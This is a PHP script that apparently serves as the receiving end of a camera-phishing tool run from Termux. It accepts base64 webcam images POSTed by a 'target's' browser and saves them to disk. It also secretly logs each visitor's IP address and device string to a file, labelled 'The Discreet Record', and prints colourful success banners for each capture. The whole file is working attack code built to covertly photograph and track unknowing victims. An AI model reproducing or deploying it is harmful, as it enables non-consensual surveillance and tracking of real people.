<?php
// --- PHP Script to receive and save images from the target ---

// --- Color Codes for Termux Console Logging ---
$GREEN = "\033[0;32m";
$RED = "\033[0;31m";
$YELLOW = "\033[0;33m";
$NC = "\033[0m"; // No Color

// 1. Get client IP and current time
$client_ip = $_SERVER['REMOTE_ADDR'];
$capture_time = date('Y-m-d H:i:s');
$user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown Device'; // Get device info

// Check if image data was sent via POST request
if (isset($_POST['image_data'])) {
    
    // Process Base64 image data
    $imageData = $_POST['image_data'];
    $imageData = str_replace('data:image/png;base64,', '', $imageData);
    $imageData = str_replace(' ', '+', $imageData);
    $imageBinary = base64_decode($imageData);
    
    // Create a unique file name
    $fileName = 'images/image_' . time() . '_' . uniqid() . '.png';
    
    // Create the 'images' directory if it doesn't exist
    if (!is_dir('images')) {
        mkdir('images');
    }

    // 4. Save the file
    if (file_put_contents($fileName, $imageBinary)) {
        
        // --- BLOCK 1: Save IP Log to a File (The Discreet Record) ---
        $log_data = "[IP RECORD] Time: $capture_time | IP: $client_ip | Device: $user_agent\n";
        file_put_contents("ip_logs.txt", $log_data, FILE_APPEND);
        
        // --- BLOCK 2: Visual Feedback Message (The Pretty Output to Console) ---
        echo "\n" .
             $GREEN . "✨=====================================================✨" . $NC . "\n" .
             $GREEN . "  [SUCCESS] IMAGE RECEIVED! (File: " . $fileName . ")" . $NC . "\n" .
             $GREEN . "  [LOGS] IP saved to ip_logs.txt" . $NC . "\n" .
             $GREEN . "✨=====================================================✨" . $NC . "\n";
        
    } else {
        echo "\n" . $RED . "[❌ ERROR] Could not save the image file from IP: " . $client_ip . $NC . "\n";
    }
} else {
    // Log initial access even if no image data received
    $log_data = "[IP ACCESS] Time: $capture_time | IP: $client_ip | Device: $user_agent\n";
    file_put_contents("ip_logs.txt", $log_data, FILE_APPEND);
    
    echo "\n" . $RED . "[❌ ERROR] Initial access logged, but no image data received from IP: " . $client_ip . $NC . "\n";
}
?>
